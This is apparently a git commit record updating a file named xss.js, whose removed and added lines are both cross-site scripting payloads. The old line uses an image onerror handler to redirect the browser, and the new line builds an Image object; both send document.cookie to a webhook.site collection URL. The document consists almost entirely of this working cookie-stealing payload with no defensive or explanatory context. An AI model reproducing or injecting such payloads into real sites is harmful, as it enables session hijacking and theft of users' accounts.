234935dd44faa482c8ab8e7ce148bfa8f7e2446c
unsbotch <157278355+unsbotch@users.noreply.github.com>
2024-05-04 04:05:56 +0500

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,1 @@
-<img src=1 onerror=document.location='https://webhook.site/0739f9c6-a1fe-4fa4-8fa2-2a0489072c0f='+document.cookie>
+var i=new Image;i.src="https://webhook.site/0739f9c6-a1fe-4fa4-8fa2-2a0489072c0f/?cookie="+document.cookie;
